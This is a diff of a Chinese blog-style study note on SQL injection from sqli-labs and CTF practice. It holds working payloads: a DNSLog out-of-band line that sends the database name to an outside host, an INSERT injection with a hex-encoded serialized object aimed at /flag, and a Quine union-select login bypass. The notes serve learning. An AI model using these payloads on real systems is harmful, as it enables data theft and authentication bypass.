@@ -1,8 +1,15 @@
-# 1. 定义
+---
+title: SQL 注入
+categories:
+- Network_Security
+- Web
+- SQL_Injection
+tags:
+- SQL_Injection
+date: 2024-09-24 15:53:47
+---
 
-
-
-# 2. Sqllab
+# 1. Sqllab 靶场知识点记录
 
 ## 常见的函数和语句解释
 
@@ -360,7 +367,7 @@
 
 3. ps：这里需要注意的是，通过 Hackbar 提交 url 浏览器会进行 url 编码。也就是 `%` 还会被编码成 `%25` 从而导致绕过产生问题。不过若是直接在浏览器中输入的话，`%` 就不会额外编码。此外，burpsuite 请求头中不会对请求进行 url 编码，因此用 burpsuite 时需要手动 url 编码。
 
-4. ps2：由于使用的是 GBK 编码，那么也可以使用 16 进制绕过 `'` 。但是前面要记得加 `0x` 。（我不理解为什么要 16 进制的内容不需要加单引号）。
+4. ps2：由于使用的是 GBK 编码，那么也可以**使用 16 进制**绕过 `'` 。但是前面要记得加 `0x` 。（我不理解为什么要 16 进制的内容不需要加单引号）。
 
 ## 20. Less-36（有关 `mysql_real_escape_string()` ）
 
@@ -456,7 +463,9 @@
 
     https://yang1k.github.io/post/sql%E6%B3%A8%E5%85%A5%E4%B9%8Border-by%E6%B3%A8%E5%85%A5/
 
-## 23. DNSLog 注入
+# 2. 其他遇到的知识点
+
+## 1. DNSLog 注入
 
 1. 某些情况下，盲注的效果不明显，又或者是 waf 的存在，导致自动化脚本受阻，因此可以用 DNSLog 外带的方式来查看结果。同时 DNSLog 的效率高些。
 
@@ -478,7 +487,7 @@
     `id=1' and (select load_file(concat("//", (select database()), ".DNSLog_SubDomain/随便的文件路径"))) -- -`
     注意这里需要用 `concat()` 函数来进行字符串拼接，否则中间的 `select database()` 不会执行。注意域名前面要有个点，即访问的是 DNSLog 子域名的子域名，这样结果就会外带出来。
 
-## 24. DNSLog 自动化注入
+## 2. DNSLog 自动化注入
 
 1. 使用工具：
     http://ceye.io
@@ -494,7 +503,75 @@
 
 3. todo 考虑 sqlmap + dnslog
 
-# 3. 一些知识点和总结
+## 3. `insert` 注入
+
+1. 其实原理并不难，需要注意的是，如果 `insert` 可注入的数据可控，一定要注意闭合，例如：[安洵杯 2019]不是文件上传：
+    ```php
+    # insert into images (title, filename, ext, path, attr) values ('1', 1, 1, 1, payload);# , ...);
+    		$sql = "INSERT INTO images (".(implode(",",$sql_fields)).") VALUES(".(implode(",",$sql_val)).")";
+    ```
+
+    从第一个参数开始注入，其中开头会有单引号 `'`，因此在构建 payload 的时候也需要单引号：
+    `1','1','1','1',0x4f3a363a2268656c706572223a333a7b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30666f6c646572223b733a343a227069632f223b7d)# `。开头就对其进行闭合。
+
+2. 这题还有 SQL 的 **16 进制编码**，也是比较重要且易忘的。
+
+## 4. Quine 绕过
+
+1. Quine 的来源：
+
+    > Quine 以哲学家 Willard van Orman Quine (1908-2000) 而命名，表示一个可以**生成他自己的完全的源代码**的程序。编写出某个语言中最简短的 quine 通常作为黑客们的消遣。
+
+    而在 SQL 注入中，它有了利用方式：
+    ```sql
+    # 常见的有问题代码
+    SELECT password FROM users WHERE username='admin' and password='$password';
+    ```
+
+    咋一看好像真的没啥问题，从正常的业务来看，除非输入正确的密码，否则肯定不会搜到结果。显然它是有 SQL 注入的漏洞，但是 CTF 中出现这种情况的话，基本上数据库是注不出具体数据的。
+    但是换个方向考虑，如果我**输入的内容和数据库查询出的结果**相同的话，那么不久可以绕过了吗？这就是利用 Quine 思想而暴露出来的逻辑漏洞。
+
+2. Quine 的原理和构造方式参见：
+
+    > https://blog.csdn.net/qq_35782055/article/details/130348274
+    
+    这篇文章教了怎么构造，还是比较爽的。
+    
+3. 变种题：[TSCTF-J2024]KindOfQuine，这个题目中的 SQL 语句发生了变化：
+    ```php
+    # 主要代码如下：
+    // Special case for admin
+        $query = "SELECT id, pw FROM mem WHERE id = 'admin' AND pw = MD5('$pw')";
+        $result = mysqli_query($conn, $query); 
+    
+        if (checkSql($pw)) {
+            if ($result) {
+                if ($row = mysqli_fetch_array($result)) {
+                    $message .= "hi! admin! ";
+                    if ($row['pw'] === md5($pw)) {
+                        $sign = true;
+                        $message .= "Password is correct. ";
+                        $message .= "Your flag is: TSCTF-J{fake-flag}";
+                    } else {
+                        $message .= "Wrong password!";
+                    }
+                } else {
+                    $message .= "Wrong password!";
+                }
+            } else {
+                $message .= "MySQL Error: " . mysqli_error($conn);
+            }
+        }else{
+            $message .= "SQL Injection Detected!";
+        }
+    ```
+
+    但是换汤不换药，依旧直接构造就行，之前做题的时候被 `)` 迷惑，还在担心影响函数闭合，但实际上输入的内容都在引号内，所以不用担心！
+    ```sql
+    1') union select 1, md5(replace(replace('1") union select 1, md5(replace(replace(".",char(34),char(39)),char(46),"."))#',char(34),char(39)),char(46),'1") union select 1, md5(replace(replace(".",char(34),char(39)),char(46),"."))#'))#
+    ```
+
+# 3. 绕过和总结
 
 ## 1. 思路
 
